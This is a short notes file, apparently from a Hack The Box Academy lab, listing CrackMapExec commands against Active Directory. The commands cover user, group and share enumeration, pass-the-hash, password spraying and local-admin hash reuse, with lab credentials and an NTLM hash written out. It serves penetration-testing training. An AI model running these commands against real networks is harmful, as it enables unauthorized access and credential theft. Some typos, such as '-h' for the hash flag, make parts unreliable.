# User enumeration
non cred
```
crackmapexec smb 172.16.5.5 --users
```
cred
```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
logged on users
```shell-session
crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
# Group Enumeratin
```shell-session
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

# Share enumeration
```shell-session
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
```shell-session
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

# Passthehash
#passthehash
```
crackmapexec smb ipadd -u administrator -h hash
```

# Password Sprayinig
```

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

# Local Auth
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```